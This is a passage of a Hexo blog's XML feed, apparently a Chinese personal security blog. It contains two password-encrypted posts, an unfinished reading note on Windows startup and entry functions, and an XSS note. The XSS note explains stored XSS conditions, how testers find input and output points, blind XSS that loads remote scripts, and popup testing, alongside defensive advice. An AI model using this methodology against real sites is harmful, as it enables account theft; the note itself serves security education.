bfed91e5ac13584df2ad393c73fe082295da261027386ccec87ed16da200b1f8c050357b5b0992a5ce5579b6e69c247df823c1a7dd564c455adcb162708e885cf02f34b4cead685f746d34a0e7b2a6e03da99219bd3e0df3bdb56ac5b6fb61e7912a592cc2652f959ef55530efb1b9abe67fc77e9504309acf2876e2799ba813fb5ecc5aaf54692232def9cdf1bc9988a223bb8493ad796c8dd1257f9342d27441e7576e8083c53ac8ec4eaf18c55823b8c72936007418264515b8a8f0055e717d4a6138ba68bede8755507b2f0253bf0f1761f4f654385440098eaeb19a3a699836dc8c1c36eee75bde5cb54c28f193c49688d3eeb2bdd6296b8ba5d6918813a9adfc84b7c42e1c0610e5bc323aed1a9a80e6d909f53ed04cd9a7fb48a5a670eed3723825892189e2ec4f7a5d39bdfd7609d61c910a8ad3b931864a994b4613a3e1c9d58ad693f43850d72a65c14765e4e0584f203a4397868db871e271b90d4191e5e3f9d73d3cbd245235824667d449044e4311eb0177f4939fad48238f4ced3e8fcaa4b17f6adf1368174c165b44a35f0bcf503338a7fbad702f89528ae220624c3cf00710d57aa3d9227ff330d7e4c2249306a7a571fb6999d4eaa6078f830deced02d17fb1b9f3cbfb6b8e7656cb39f4ecd21f105c138390e229a8c880bbace323f45733788dc9604e752de87503d5d465c30bfa28a486995abe79b35636ad10c11601ec529cc66fe8519d19e4ebc9f1d35d720a0b06512aae99510dd5539883edf38f14649ac6bb714d2a5d9703f66f</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>启动函数和入口函数</title>
    <url>/post/translater-start-entry-function/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<p><img data-src="https://img.shields.io/badge/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E3%80%8AC++%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E8%A7%A3%E5%AF%86%EF%BC%88%E7%AC%AC%E4%B8%80%E7%89%88%EF%BC%89%E3%80%8B-1fd0f6.svg?colorA=ff69b4"></p>
<p><img data-src="https://img.shields.io/badge/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E3%80%8AWindows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%EF%BC%88%E7%AC%AC%E4%BA%94%E7%89%88%EF%BC%89%E3%80%8B-1fd0f6.svg?colorA=ff69b4"></p>
<h2 id="1-程序的启动函数和入口函数"><a href="#1-程序的启动函数和入口函数" class="headerlink" title="1 程序的启动函数和入口函数"></a>1 程序的启动函数和入口函数</h2><div class="note default"><p>Windows支持两种类型的应用程序：</p>
<ul>
<li><strong>GUI</strong>：图形化应用程序（图形用户界面程序）</li>
<li><strong>CUI</strong>：控制台应用程序（控制台用户界面程序）</li>
</ul>
</div>

<p><strong><code>main</code>、<code>Winmain</code>函数被称为入口函数，入口函数被调用前，会先运行启动函数，然后由启动函数来调用入口函数。</strong></p>
<p>启动函数和入口函数在多字节编码（ANSI）和Unicode编码环境下是不一样的，具体对应关系如下：</p>
<p><img data-src="https://i.loli.net/2021/11/18/fplLEeshwGWT9Vz.png" alt="4.png"></p>
<p>也可指定&#x2F;移除链接器开关（如果移除链接器开关，程序将会自动判断子系统），VS中设置如下：</p>
<ul>
<li><code>/SUBSYSTEM:WINDOWS</code></li>
<li><code>/SUBSYSTEM:CONSOLE</code></li>
</ul>
<p><strong>入口函数</strong>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">int</span> WINAPI _tWinMain(</span><br><span class="line">	HINSTANCE hInstanceExe, </span><br><span class="line">	HINSTANCE,</span><br><span class="line">	PTSTR pszCmdline,</span><br><span class="line">	<span class="keyword">int</span> nCmdShow);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(</span><br><span class="line">	<span class="keyword">int</span> argc,</span><br><span class="line">	TCHAR *argv[],</span><br><span class="line">	TCHAR *envp[]);</span><br></pre></td></tr></table></figure>

<p><strong>启动函数</strong>：</p>
<ol>
<li>启动函数由KERNEL32.dll中的<code>KERNEL32</code>函数调用，我们无法查看KERNEL32.dll的源码。</li>
<li>VC++自带<a href="https://www.cnblogs.com/renyuan/p/5031100.html">C运行库</a>的源代码，可以在<code>crtexe.c</code>中找到这4个启动函数的源代码。</li>
</ol>
<h2 id="2-CUI程序"><a href="#2-CUI程序" class="headerlink" title="2 CUI程序"></a>2 CUI程序</h2><div class="note warning"><p><strong>调用顺序：</strong><mark class="label default"><code>KERNEL32</code> --&gt; <code>mainCRTStartup</code> --&gt; <code>main</code>。</mark></p>
</div>

<h3 id="2-1-启动函数"><a href="#2-1-启动函数" class="headerlink" title="2.1 启动函数"></a>2.1 启动函数</h3><div class="note danger"><p>启动函数工作流程：</p>
<ol>
<li><p><mark class="label danger">GetVersion() ：</mark><mark class="label success">获取当前运行平台的版本号</mark>。控制台程序运行在Windows模拟的DOS下，因此这里获取的版本号为MS-DOS的版本信息。</p>
</li>
<li><p><mark class="label danger">_heap_init() ：</mark><mark class="label success">用于初始化堆空间</mark>。在函数实现中使用<code>HeapCreate</code>申请堆空间，申请空间的大小由<code>_heap_init</code>传递的参数决定。<code>_sbh_heap_init</code>函数用于初始化堆结构信息。堆结构的说明将在第7章详细讲解。</p>
</li>
<li><p><mark class="label danger">GetCommandLineA() ：</mark><mark class="label success">获取命令行参数信息的首地址。</mark></p>
</li>
<li><p><mark class="label danger">_crtGetEnvironmentStringsA：</mark><mark class="label success">获取环境变量信息的首地址。</mark></p>
</li>
<li><p><mark class="label danger">_setargv() ：</mark><mark class="label success">参数分析。</mark>此函数根据<code>GetCommandLineA()</code>获取命令行参数信息的首地址并进行参数分析，将分离出的参数的个数保存在全局变量<code>_argc</code>中，将分析出的每个命令行参数的首地址存放在数组中，并将这个字符指针数组的首地址保存在全局变量<code>_argv</code>中。这样就得到了命令行参数的个数，以及命令行参数信息。</p>
</li>
<li><p><mark class="label danger">_setenvp() ：</mark><mark class="label success">环境变量分析。</mark>此函数根据<code>_crtGetEnvironmentStringsA</code>函数获取环境变量信息的首地址并进行分析，将得到的每条环境变量字符串的首地址存放在字符指针数组中，并将这个数组的首地址存放在全局变量<code>env</code>中。</p>
</li>
<li><p><mark class="label danger">_cinit() ：</mark><mark class="label success">用于全局数据和浮点寄存器的初始化。</mark>全局对象和IO流等的初始化都是通过这个函数实现的。利用函数<code>_initterm</code>进行数据链初始化，这个函数由两个参数组成，类型为<code>_PVFV*</code>，这是一个函数指针数组，其中保留了每个初始化函数的地址。初始化函数的类型为<code>_PVFV</code>，其定义原型如下：</p>
<p><code>typedef void (_cdecl *_PVFV) (void);</code></p>
</li>
</ol>
</div>





<h3 id="2-2-入口函数"><a href="#2-2-入口函数" class="headerlink" title="2.2 入口函数"></a>2.2 入口函数</h3><p>1</p>
<h2 id="3-GUI程序"><a href="#3-GUI程序" class="headerlink" title="3 GUI程序"></a>3 GUI程序</h2><h3 id="3-1-启动函数"><a href="#3-1-启动函数" class="headerlink" title="3.1 启动函数"></a>3.1 启动函数</h3><h3 id="3-2-入口函数"><a href="#3-2-入口函数" class="headerlink" title="3.2 入口函数"></a>3.2 入口函数</h3>]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Web 安全防护指南基础篇-XSS攻击</title>
    <url>/post/web-basic-safety-guide-xss/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>

<h2 id="1-XSS攻击原理"><a href="#1-XSS攻击原理" class="headerlink" title="1 XSS攻击原理"></a>1 XSS攻击原理</h2><p>存在 XSS 攻击的地方一般为：评价功能、论坛私信、留言、在线信箱….</p>
<p>一般分类为：</p>
<ul>
<li>反射型跨站攻击： 浏览器---服务器交互</li>
<li>存储型跨站攻击：浏览器---服务器---数据库交互</li>
<li>DOM型跨站攻击：浏览器---服务器交互</li>
</ul>
<p>可以实现：获取用户 Cookie、进行内网探测、弹出广告等。</p>
<p>上传的业务流程如下图：</p>
<p><img data-src="https://i.loli.net/2021/01/06/ed2BOUiwWj1yXcn.png" alt="屏幕快照 2021-01-06 下午1.25.46.png"></p>
<div class="note default"><p>其中两个关键点是：</p>
<ul>
<li><mark class="label default">入库处理</mark>：攻击脚本需存储在数据库中，可供当前应用的使用者读取。</li>
<li><mark class="label default">出库处理</mark>：由当前功能的使用者按照正常的业务流程从数据库中读取信息，这时攻击脚本即开始执行。</li>
</ul>
</div>

<div class="note warning"><p>XSS 攻击成功必须满足以下四个条件：</p>
<p>（1）入库处理</p>
<ol>
<li>目标网页有攻击者<strong>可控的输人点</strong>。</li>
<li>输人信息可以在受害者的浏览器中显示。</li>
<li>输入具备功能的可执行脚本，且在信息输入和输出的过程中没有特殊字符的过滤和字符转义等防护措施，或者说防护措施可以通过一定的手段绕过。</li>
</ol>
<p>（2）出库处理</p>
<ol start="4">
<li>浏览器将输入解析为脚本，并具备执行该脚本的能力。</li>
</ol>
</div>

<p>如果要实现一个 XSS 存储型跨站攻击，<strong>以上四点缺一不可</strong>。如果需要做针对 XSS 攻击的防御，只要针对上述任何一点做好防御，攻击就无法正常开展，XSS 漏洞也就不存在了。</p>
<p><strong>总结</strong></p>
<p>作为攻击者，如果要利用存储型跨站漏洞攻击，则先要将攻击脚本存储在服务器端，并且保证攻击脚本在读取后可顺利执行。当应用功能对上述条件均满足时，才可保证漏洞被成功利用。</p>
<p>作为防护者，了解到实施存储型跨站攻击的前提及必要条件后，从防护角度，可以选择禁止攻击脚本存储在数据库，即在入   库时做处理;或者对攻击脚本进行转义，避免出库时顺利执行。满足以上两种条件中的任何一个即可实现有效的防护。</p>
<h2 id="2-XSS漏洞测试流程"><a href="#2-XSS漏洞测试流程" class="headerlink" title="2 XSS漏洞测试流程"></a>2 XSS漏洞测试流程</h2><p>由于 XSS 漏洞需要使用者浏览后才可触发，某些后台需要管理员触发后才能被发现，如果用户一直不触发，漏洞就一直无法检查出来。</p>
<div class="note danger"><p>漏洞的标准挖掘思路如下：</p>
<ol>
<li>漏洞挖掘，寻找输入点。</li>
<li>寻找输出点。</li>
<li>确定测试数据输出位置。</li>
<li>输入简单的跨站代码进行测试。</li>
</ol>
</div>



<h3 id="2-1-寻找输入点"><a href="#2-1-寻找输入点" class="headerlink" title="2.1 寻找输入点"></a>2.1 寻找输入点</h3><p>一般情况下， XSS 攻击是通过“HTML注入” 方式来实现的。也就是说，攻击者通过<mark class="label info">提交参数</mark>，意图<mark class="label warning">修改当前页面的 HTML 结构</mark>。XSS 攻击成功时，提交的参数格式在当前页面<mark class="label default">拼接成可执行的脚本</mark>。可见，XSS 漏洞存在的要求就是：当前页面存在参数显示点，且参数显示点可被用户控制输入。因此，寻找用户端可控的输入点是 XSS 攻击成功的第一步。</p>
<p>在一个常规的网站中，存储型 XSS 一般发生在留言板、 在线信箱、评论栏等处，表现特征是用户可自行输入数据，并且数据会提交给服务器。通常可以通过观察页面的交互行为来确定输入点。通常情况下，要求可提交数据量至少在20字符以上，否则<code>JavaScript</code>脚本很难执行。在日常应用中，如留言板、意见反馈点、私信、文件上传信息输入框、在线提交信息、在线信箱、评论栏等功能都允许用户输人100字左右，均能达到 XSS 攻击对允许输人字符的要求。</p>
<h3 id="2-2-寻找输出位置"><a href="#2-2-寻找输出位置" class="headerlink" title="2.2 寻找输出位置"></a>2.2 寻找输出位置</h3><p>XS S攻击的受害者是访问过包含 XSS 恶意代码页面的用户，输入内容需要在用户页面上进行展示才能展开 XSS 攻击。针对一般的留言板、 评论栏系统，安全人员能根据经验轻松地判断出输出点的位置；对于一些不常见的系统，可以通过将输入内容在回显页面中进行搜索来确定输出位置。测试主要基于两个目的：</p>
<ol>
<li>确定网站对输入内容是否进行了输出，判断是否可以展开 XSS 攻击。</li>
<li>有时候需要根据输出的位置的 HTML 环境来编写有效的 XSS 代码。</li>
</ol>
<p><strong>XSS盲打后台</strong></p>
<p>指在攻击者对数据提交后展现的后台未知的情况下，网站采用了攻击者插入了带真实攻击功能的 XSS 攻击代码（通常是使用<code>script</code>标签引入远程的<code>js</code>）的数据，称作<mark class="label danger">XSS盲打</mark>。当未知后台在展现时没有对这些提交的数据进行过滤，那么后台管理人员在操作时就会触发 XSS 来实现攻击者预定好的“真实攻击功能”。</p>
<p>通过上面两个步骤的测试，可发现具体的输入点及输出位置，那么存在 XSS 漏洞的基本条件就已经具备了。但 XSS 攻击在这个测试点是否能顺利进行，就需要通过一些基本的跨站代码来测试，如果其中环节被过滤，则攻击依然无效。测试 XSS 攻击的经典方式就是<mark class="label primary">弹窗测试</mark>，即在输入中插入一段可以产生弹窗效果的<code>JavaScript</code>脚本，如果<strong>刷新页面产生了弹窗，表明 XSS攻击测试成功</strong>。</p>
<h3 id="2-3-XSS进阶测试方法"><a href="#2-3-XSS进阶测试方法" class="headerlink" title="2.3 XSS进阶测试方法"></a>2.3 XSS进阶测试方法</h3><p><img data-src="https://i.loli.net/2021/01/07/kZSaULiMHnV6QPX.png" alt="屏幕快照 2021-01-07 下午2.00.46.png"></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>知识笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE-XML</title>
    <url>/post/xxe-xml-dtd/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="25d0faea82d052eca74e4b26b252b86551556b82b6c48e81c400a20538eb7f4f">f2cb6dad3997b265c98f36a97452129ce2ae9803c34f2ae5199970a97e1e1b92dcdc1df64c72d67c23e25e4072007058f3e71139b5684d53603438a4fb1d42d907a8c5f0224c60d21428f0ee9733f8a33840cd9cab29ed690b3691f527179cd268389526a2e12d50013b7068eb5e9f0da9ebd0afd364c6c5f5a3b447a0d680d8970c2439a4cba377cf50ccc68d259f30fd7d59089b694dbea5c172670d746ab1a2a8887f8de8c31e4adca5be9716555ecfdbbcc23fbf202b2a8af90e46c9edfd129acf04c705d4963366fc33fdd568fc5db7d3ca223da4b6e92cff281c5ad51a0aa1b1c7a060b9a0b7016c461906a5bc8eeed4832b593075c2c5818332f86b2c4b3ddc870545e18c6de2e6cdb59a5b8824d8b31e6810b71c471b86dc715a03f90f644a15e831ddb5afc4fae0a3f4339d98f7c9ce2f2b51425007468f517f9e8a9e59af8c3ff14bbbc25920fae4b485964c305eca3332e1cfa7b8c4b3628264cf5f0c024fce6e17cd0deb6c5134f740e136405da9c52b5cdb624626ff73fdf3c7873483ec5ae05e398848fa7ebc8ed4f338c1ee4a13d552a08cc451c1e9ade336a43467776ae8f1e89385063a3ee67bd597db0c8817107436b9d4cbfaccbe70a20c19ea80853ee88632a705db0e2b1389e48cd6ea21e595155c60de0f88e864f970a121947c8b9ad8903154a35e40968dec721321a4a2119b4767e9e4631b9d6161867c0774471fa5895d37d58af1061e0aa02a92ef9a3e5a6af01d269646cae6351de8f7783654c740f03fecc02df9865e86b2459932ec3aa27b9500392236e7cc9fccd1346ebd6377052e59d4d6dc3c0747b8062b63a00a46c99d82c51b42bd54e7a4e648371e88723c610239c7c183e6fd58689309f420a4e3c8c2cf358af5a1429b85d18be0986a67e1436b808e26c6b6d70707678a5a62e659bf7c8de56872f23392b4e29fb4b02db705bc9d89e9f45befb75e12e4e77154b4fd1989df0023d2444e5442202b4d283fa2633e17f685df7d71410b1cdbbdf67cab50302363079aa97f2deec69cbeacf3cf09521bc92893aa09700a3e565bbb6858bbf298885ce7d2656ce2126a4f1e45b80ed8db19614bf45d6ef5aa78f85135333b66274ba3be2ea24cd8c5c91ecead83d6864d77908bd7bb4207dadfb75f38fff3cd4b3729a08639294a649a0875df870a3b83514215ad2c65425e103f1be3e68c24a42c3071fe939422904780c839089a0e7cc6097e26a91aa1755c862ff2d1fbd7e8103e5463671df41eda746525a7adc93b1c36a577d4b50c040b6b96f76a0990693a2f5fb1a72c634993251319670456ffc43ef4b1d52fda69806cd52c271c49e77cec59103ce5a2ab406a56eef4e893e5d886c73b43ae026792095de377ace624c432763985328b82fce1a7ced93877ee99c4123515b85dd889508a9ac875f0e32c27e7de98bfd732b24f89952a3a14915f56bdd666485fadc962d7f27364f166dcb9501a01264eb03d96723a54d00af919cdae3770cd62597f9b0e8da99066838bb2531cc5ab587cb8f9d290d1047ea3324413acceacf48294b5d2aa75c44313980e8f47b041394e87ac01138337e24826064f3d2fb51d9f40f163172b0632f1bbfcf57c422bf1aba49f9f883fd5bfda95aaed6929d4a75a6f671e3cd8b756f8f38db41e8d0e6e7a68858ba66d49429c720519edd31d348ad2f719f16aa55b21fc0094e3fae0734febc474a32004d54a148c0f4d2cfb5373b38614af274775dc2ebee90d0cb4ed427faaf98f66c9ad2989e2a00dfa182ee8ef1b4ba239ab4dd85fba5d3212e5325fc9966b793dfc455a4360c1fcec655959065cb816a0d9a82df40894fe848a10d535ddc0cc4e0be86ab2e3b8eaa952e999ccf1dc747676a6a4b9bb8013bb4163e6c50a16d322690e62ef519001f1a52b72b33ff5fefaf508a991c68e267300ddaff724ce45a205501e515218ddcd99fa1ab3f6c356ad4c4822b35bad850fa478723e9b20d2b173fdfe7e408d0317f2f8da600bb72ea27a9c7794e073355de30b812df3175c650759799724ab196306bcc85e7e5bf2b21df3c2eccb7549b5962a422f28c0118de79cb7b80f5c37904adbeaf015a3cca5f0fd876da8a736563fc67cd16f69d60b686e12c22caba7cbac752ce367cc68e0f35a325201c1ecdf6af2872a6b9a352d34314e7734f4759b07a7d2d0ae1fdf19bc13f6b2bde055e6b7daefcda633bb66927c309a4e87bfa7aa8f58c6fc1a209aecf979fcf0b0436fe0400d5153fb825480e21903803afd6d4e78702c2054e889953c05e9ffa9b9ea6a6bccc7998e651a8e32b26eade77391b5e5e3563d3e3b45f19cf8f6272291567a46b024dfef4d120be17d189cc528d5b25517024345a5b8a53e866f19e74d6bc3fafa51c43f136ad0c0a99bb30f59729a31f95a8517e4ebe8eae47d3ffa1d6804337d6a170511da37c8c3410d73a993358cbe694055a74a442ed55455114b549577487ef007c045bf5e687bdbaacbe2298ef490b39cdd9709f2df6173a106e7bc0459d3c9d0d6820994ea6822402223a64082ca3e951d07df3ed986434c42705b308511a85de8998a309cc3ae2bf8ef0cbe7d099bcb3507fb0145daf57a2d7e6b2bd3c9cd00b45405158c1171233fe1fd4c8e782bdb7309985fa319e3814d938175d3edcd870b2bb9e4e8aa87d6336001aa7653354720733ebc59c7d55b1f08ddbf88e28c454158ae6c948ffc8fe34372205cbbd990f29547350003056fec8c115e92ed95b085fa718d4d2e2a5edc0c8d22c3dfb7146aa34c4b3852c95bcdf58bf2939d0506936a465c0047b381340f4a79bdf68db0f2f2cce6f38fa40f297f6d8ec873efa24254b819b32bf30d29d39fab459124fb3e09824af3ce5c0791fed849a46161fddf90ffad4bb780b0266086522c4c0b647a97140969bbe68a27ae51649ed6005dd61ed8c5d881391e962f6d16173e2b4189991f84a3eba0512caf825657f5d3cef12989c95cddff6ff8ccc78eedccc8a8e9663fc520a232889f37fed1e712100d02eb1ec02b16e8164dfd393a768e570fd811bdc01033dba248ffd92d518662c7837712493a3c976f9b0f723f2f8d6d75271cbf227b396ecdf6da9e1d068a92fc2ea3f06a0f2b1fa6a25c4d9ecb3f1b2d0fa8e2dc366e43211e65f34133fb3e335252af7a6b19db49538b5e4a776158e24e84a58919c31fdcda7060d4299b205e2ee7190005d7b3b5c68068354c9d3785634a519a3db183489a89e2c6afce398e4d186a9de0c3b2f6603d74aa0e85a7a0a1cd6667c66ef492f359f62147c885e12957940a186e5beca6be8dfecd8c5b30b5afa254630df78f52bf9d360d07c85552ea74343c6471b891a867e3bc407bf6dd1b0f27c109b6977930a7863f32908be7b4c97375c3c64f36e46cfff781542081b819e6395acd9fc6c7343ea1b1f00c12da546f6635e8aae5e20c0346498fa635695fe35e5a1f5f24639fb3eb465880964d29f3c018d0899061b0f2e8b219b6c9633a71e96993fc615902f9b4e9e4bfa2e4382335fde4d557c5e290a55da591d162727a5026c7ceede377d9dadad6d4929fff321a9bdd37d093377b7673829399e9bf090d57855b2193fdc2ee5815397ca27dd3bf46174eaceeefdd172b5d1cf81a5115c758ee3b4c061c37538820f6d3ff2b0e3f640db6ce92fc50226560699664ea1d612ef2e86f4da724293e6d99389b5f39b999f89e382f91d2b3bcd17c5154764c7f6ed8030899249f721521f51d246a530929f4da6e415a62698c8dd1ca9b15e08d4334019592ab8edc5e6c8cdec10382274e981e900b43b0f031b9bc2effff1fa9508233ad19bd850a26205b22624819644d98685d981e8535029ffbcd5f5b4b427e58acd2499b7ec939ed016f72716fdef00b6902be8bdfaf9bf7cc288823188991c5c5994bf09c04c7e87d86142f66e6caa260c716c48787f5020b35ca1d432f9925f6faedd2466d30410e56f152685036ed9c44c24d91f5353453597d867a1747943541edc919d0a0ac3d2c09b8908aab11d17f05fa7664e9ce68022583d9f9bb6e047bf088ee62d07ac24947fbb0ef81fe2c40dd67c0997c49779999467f7834416ee44adf57b97f358a42f4158e8c0bc2e59f3e9e58cb485d04f4a8f1f508fcc6984a62894d756e94eff15a64c2eedbec0e6ecc867321dffc259bff95811d7e326b13ddb1675a498cc63e63c153546652405c2c51c819c2821b05f61a7907557755fb97d7fac692f0ae7305aacd4e9440b5054eef849ef754e38e67cb83dc72d9ebe1b1d96375f292c7bca3313127b01c1d1c9f6a00124a8c95e8a17f0546b579ec9a274a22ee4a7975461d4fbf4e1f1c6e64509bd1a42a6582aa1fe0230bbf6971d608b217e964dac090d684fb3cfb5c08cbdf2945d617421711dc972503b212885b1cd3720f065a8323f3ea2ea804da3b42ffad4f45798c975c0b6e8e6c4dc917d2752b4ad6fa1e7146576290386d3e3a7af70a87b36c7f85e92b85d36e19e0847425f47c280d565b3067a6365285f47f3836b3eaababdf52ffc87154ce7049ae8afb18f857b860def94a30c2f0710f394f4ab102ed712cee389b1c88434fa49703354f473ec434321bdbc7ca096f24d40669d28ac3d4fe5ce9a848c21ee8d2b541d55fe9602708ff1f1a21ac0a7d389b7205b6250e39121d7c2f3547a9eb4bff553121d0f5e6948161cee1ae89db1a1eebaea90bd44351d412bfa4d2188a0594973911769c4fcb98661a9e142ec8f85bb8a66f82ebb3168b5acab83fbf22ae17e702f25a37a5e838ba4eef80eaee2b6257b7733656b3ebb7b542aa1f91b0020c2b6cd8ea001d02db9c6152caebc908e6111e1e73fcaf86a537f39bf214a6f90fcad535c56136a41b39017528f7e5390f6f6e9ed9cee8cea52658c505898a1f92d2713696a86bfa3e8c5f3d4e262017f0e3a053d17f645576ac9c36530a33ead04d1994b817e350100b40eda574a516d799f6437bb0a2ff8740df6fc1bd1cff8f22fcfe02f3d804b3f7a9859fc6dd98a0403845b92b57b57972641d867bd2145a963a7547dca174da0fa52f44e43fa42b96b3f83e08eebd75e1fdd4081590e0dbe6088c4ad925984de672cb5626e22fc8cdf5f0ba5178e0a622e1a9c8ba2c22eea30e61ce164a3978111ae53f99c7942687f1989d91a439845bd151736d6d552095700d54e31779a5e036822f6627174e9f052b027a29eaaf5acc491081974adc779bfe3ecafa2f0ea5245ea546873ae7ba3dcf211bc488b62902eed2ae66dd40262cfdd9436454c8d80dd0e966f15fc4d4dd9d85a0e48a06ab00673da7b6fe60e41b4085f4681e4a2bb52a578d3416882a771d22669204aeb89c0fdc8453191c510e7f5294f3116d6085b527313b9a59b15e33287d6fbd6f7eb0a3353f10a27e72412fd7ad65de0d9e108b7551bb7cfd5d962e844e35580686d0c826f1cd65b5d95d64c93fa804f6d4d0d89b08f94f6f34dce0094e1752dd449ca596778787b6b18596488817a7ec06145cdf89a6edf6622c79a51deae1a35360a05facf58e8321746c2b0e28129d29a42beeba415898e19715c36e59f52654390c511718602ef7b9b804a87b3f7bc76ceec691b66938fd23b4cab44f19066aca1adb2a43eeee9ef96f4fda13d7a9846dc63269e42951b633ee74ed1cdb78cdb1e9c3e87aca0fc92fe1f9cb6c73a22774e25b60407680c94f24b8191a7578013d63dcd00a968b9520febcfd40286087d785287205090f63d07ddecc1e58e1c598c7f48fbae55c159cde771a972972a5b1fd379ccba179c56a3436a21312e3fb4a235a8e39934e74864247bf61b46319069c841f0226f4c1fd6dd6846726f0d376afd656121d8d207c98b33133a28e102137921034cffa9e6500e31c4fd825d658898f14cd463f977db7d5f831fdb517c283753a413f65eb1c440ca41c95b130ab8a27dd4fc5658f6b1242c2aa5d1c85a1ffb4a689fd0bf4ff5fabb559328df3787c6611b5fcdc31caf54c4c1e0528afa6e74426c0a14f1d63179abf795d53f663b515216e957ced44c8b072ec3044a7a86d8b5f29307396c96afd7337d8c23804f91ffeec6879003c07614ad25543978c7fffeb6bda23127518313e909546445a2dab096ed6225d1f1706b792317a679de23a8899366b5a51745eefc47e0f976167b58abd13caf1627c70894debc45e0d6ae55749a5c5668f7d7d81661f23ddc4093a244f9366945b4997871d380371acf8dd17263d076327a54c2c57cdb5aa74de9cf9518ff2027de041227910b0ce008358a936981e616a4d1f889d0214fd6ea41706f72de2939d0a5e318564b160bfc04c5d25149844bd1b5cec75dd8e483d07afe96131d4f96506a7ad4217fd6126b1a7ca9d1ced15f06a7bd5ae33655f3f88ca963c2e8e8acc82c64afde9351f4108a50264765652407309eb96a5828788ec710d93140cb85a4f231b54cb04e28fd7cb523cf604a0726cee7ed30bbdf8ea2f1b66f4e34b7656f759b59cbd93fa7b8a372cf60a0aab2e5cc01a1b6ca7c2a4c72c657200064ee7f8902753517f5af04223a9892fd5a5be35d3509a48ebcfb406ff8ccc75081216e49a752adfb135ed67f8b94d4585f76f2737edbadd8219cfff37fd153315f3f40b12e34eb07e793a0f40fe4f7418859afd9c4d76bca2b16854ec5469054a2aecd410a37c29e04f45deba4d2e05237b43f7a01590675ea9aed12ab03ce1d881beaa0560af2d447ceee0dec6be404d28d9e9f1338612fc1b13745e39609baf248a7d1d2ec6ac61a5f86f19717cf34bfa93d39a78f9533f1fd57527db7dde37217a477201cf77b346781bee46a7d9b58530462f06e60ba0bcf54217bbec045f0ca92271136e219d230e9262f0bb1d4855d255e506807da9da0ccd5935383ba45b5a7220424c229aa3bbd76835d1f634085fb0090607b37de6ee16507da056f221b3e43e21c3b5a46792b88627d15a86696493db7f7d2c23f9aaa8abf21ddb31b3fe1eaf554e7d6017c35605242c95c89a9f70b53bc07088f57031c80653d2d0f8dc79bc127f540a79ab4a4056e8d0f26d836f1acb9ebbb9f9b90f24142aa7bc1cae1771a68601be00a34719b91f09baf3bc2c99f222c0a38ecfca45af578759a66e320c9ef3547c083265504ec423772e9f1b2cf16ec41c97ba85296b745f1c2b66820a325115ce6c96121b17f1219cb5bcae047e2af90505b0d909d2484688636220d42cc2d03c549e3756abc69ad969688907a00a56f2a9b09a9607f16fe2284533cae3bc8bb44a55c4bd42585be2eb825cc4ad1d43f82362f8df4a8466212113a08793ab3b227bac24b60f227435a4126118050f56b9e57a0f3543f8885198894a24e8325671c7edca6191089551931e79c95aab420823e4656d21a29fb7bf4cea5b703d774126c66dfcfe54bc797f2b79aac2fccb8bead4124801ee659f0132b4cc68be8ee111eee9c7afad6786c84c0c5d660a5269a1ba410278e885f603c8689424d0c0d5d33f9dfbf5f97efcb377d9358c5922f12dd7804e43a71fdf8fab34849386d2804a6d34393401d902d578a7b6e99d21a560c97715fd8fda49b3af3d4c03a72e7200d550b73eb5aa515204fb5c74c0b7d1248adcb0c96be2551e52db0b3f7345ef0f6ffdc5af55ec3444e6b091898ae53c30dc61c93e945f99b1d0604088dc9fda86c510d5b74ca595e4e6b7fc4388e17ab9c076f96054034753053dc74e0dc3709f07321162e22642faad7efbd3396fdd8fab95f8e19341c93288e95f62e4dda1d2f0d0848d274eaafd9fc8ef76d5301ccdbf3c80d838524f3ba6cef1edbaddd3935bcb830b45cc2807fb3975018c44e742ae8a0474f31634ec325756ddf75aa40a4a7dc1542464366d7f3544d02fa9def5796dcd6009d837736f4cfcd7ef65a8481e7f26f2e8e55c1c53bb38e2bc519a6448439d08bf649400bedf1da0555df5bdfa1876d3d962e64bdb7ecd977e88d571a64699022bba57a661614f5b62ba87a0e1c01b11a6c55c5bfab3a886dc0252f10cefd0560a26cb01a118f4698a51533a4d6d77bc69a6b4c7e149ff7e0169f3cdc45ee7c9cb7ef1f6d1d1eea10f0921af40b67312d128bd9e9d213617e013871266701c12865131fbd4110e6e66c938925cdcff5543266d7c01525fd42e38b6ee326896ff66ec4945c0b61739b83465c4a9ce5f145f3ab0f596f826db3bb22a38e1d188f7ff5e49661557ef6b55892f06a06b16901623c8fbba7833fd6fb0bec0ec4d66617a7a0bd3046c98e0c53cb53e0aa72c3c75d5915d0226a365af91895ff2bc4c147acc6d8eb02f67a294cf54164955bf5f0884c9f8d4055e443b5d7e50764303557ea707438f08afb2f44408ca62d1ea8baeb555fa1a7e959a0260c5b672aac3ab87134762995de96749852019df8e44ed0e20be6325ffb3cd2559dd4eda7fabe6ad6a7fcd25af2715c3a857caf6d559fbf559d3ecf763a5aa